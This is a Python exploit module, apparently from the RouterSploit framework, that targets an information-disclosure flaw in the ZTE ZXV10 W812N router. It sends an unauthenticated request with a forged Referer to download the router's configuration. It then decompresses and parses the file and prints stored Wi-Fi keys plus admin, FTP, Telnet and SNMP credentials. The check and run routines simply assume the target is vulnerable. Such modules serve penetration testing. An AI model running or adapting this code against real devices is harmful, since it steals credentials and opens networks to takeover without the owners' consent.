import re
from xml.dom import minidom
import zlib
from struct import unpack
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class ZteConfigDecoder():
    def __init__(self, data):
        self.raw_data = data[136:]
        self.dev_name_len = unpack('>I', self.read(4))[0]
        self.dev_name = self.read(self.dev_name_len)
        self.read(60)

    def read(self, size):
        result = self.raw_data[:size]
        self.raw_data = self.raw_data[size:]
        return result

    def zlib_decode(self):
        data = []
        while True:
            self.read(4)
            comp_size = unpack('>I', self.read(4))[0]
            self.read(4)
            _raw_data = self.read(comp_size)
            data.append(zlib.decompress(_raw_data))
            if len(self.raw_data) in [0, 2]:
                break
        return data


class list(list):
    def __hash__(self):
        return hash(''.join(map(str, self)))


class ParseXmlConfig():
    def __init__(self, path):
        xmldoc = minidom.parse(path)
        self.tbls = xmldoc.getElementsByTagName('Tbl')

    def getTbl(self, tbl_name):
        tbl = filter(lambda x: x.getAttribute('name') == tbl_name, self.tbls)
        return list(tbl)[0]

    def getRowValues(self, tbl, values):
        rows = tbl.getElementsByTagName('Row')
        output = set()
        for row in rows:
            col = filter(
                lambda dm: dm.getAttribute('name') in values,
                row.getElementsByTagName('DM')
            )
            result = list()
            for dm in col:
                result.append(dm.getAttribute('val') or '<blank>')
            output.add(tuple(result))
        return tuple(output)


class Exploit(HTTPClient):
    __info__ = {
        "name": "ZTE ZXV10 W812N Information Disclosure",
        "description": "Exploits ZTE ZXV10 W812N information disclosure vulnerability "
                       "that allows download router configuration file.",
        "authors": (
            "GH0st3rs",  # vulnerability discovery
            "GH0st3rs",  # routersploit module
        ),
        "references": (
            "",
        ),
        "devices": (
            "ZTE ZXV10 W812N V2",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if True:
            print_success("Target seems to be vulnerable")
            self.info()
            config = self.download()
            self.save('/tmp/config.xml', config)
            self.config_info('/tmp/config.xml')

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def info(self):
        try:
            response = self.http_request(
                method="GET",
                path="/template.gch",
            )
        except Exception:
            return

        # Check for Model Name
        Frm_ModelName = re.findall(r'Frm_ModelName" class="tdright">(.*)<', response.text)
        if len(Frm_ModelName):
            print_status("Model Name: {}".format(Frm_ModelName[0]))

        # Check for Serial Number
        Frm_SerialNumber = re.findall(r'Frm_SerialNumber" class="tdright">(.*)', response.text)
        if len(Frm_SerialNumber):
            print_status("Serial Number: {}".format(Frm_SerialNumber[0]))

        # Check for Hardware Version
        Frm_HardwareVer = re.findall(r'Frm_HardwareVer" class="tdright">(.*)<', response.text)
        if len(Frm_HardwareVer):
            print_status("Software Version: {}".format(Frm_HardwareVer[0]))

        # Check for Boot Loader Version
        Frm_BootVer = re.findall(r'Frm_BootVer"  class="tdright">(.*)<', response.text)
        if len(Frm_BootVer):
            print_status("Boot Loader Version: {}".format(Frm_BootVer[0]))

    # Download and parse config
    def download(self):
        header = {
            'Referer': 'http://{}:{}/getpage.gch?pid=1002&nextpage=manager_dev_defcfg_t.gch'.format(self.target, self.port)
        }
        data = {
            'config': (None, '')
        }
        response = self.http_request(
            method="GET",
            path='/getpage.gch?pid=101',
            files=data,
            headers=header
        )
        config = ZteConfigDecoder(response.content).zlib_decode()
        return config

    def save(self, name, config):
        w = open(name, 'wb')
        for x in config:
            w.write(x)
        w.close()

    def config_info(self, path):
        xml_config = ParseXmlConfig(path)
        table = [
            {
                'name': 'WLANPSK',
                'fields': ('PreSharedKey', 'KeyPassphrase'),
            }, {
                'name': 'UserInfo',
                'fields': ('Username', 'Password'),
            }, {
                'name': 'DevAuthInfo',
                'fields': ('User', 'Pass', 'Level'),
            }, {
                'name': 'FTPUser',
                'fields': ('Username', 'Password', 'Location'),
            }, {
                'name': 'TelnetCfg',
                'fields': ('TS_Port', 'TS_UName', 'TS_UPwd'),
            }, {
                'name': 'Snmp',
                'fields': ('ReadPassword', 'WritePassword'),
            },
        ]
        for item in table:
            table_name = item['name']
            xml_tbl = xml_config.getTbl(table_name)
            header = item['fields']
            data = xml_config.getRowValues(xml_tbl, header)
            print_success(table_name)
            print_table(header, *data)

    @mute
    def check(self):
        return True  # target is vulnerable

        return False  # target is not vulnerable
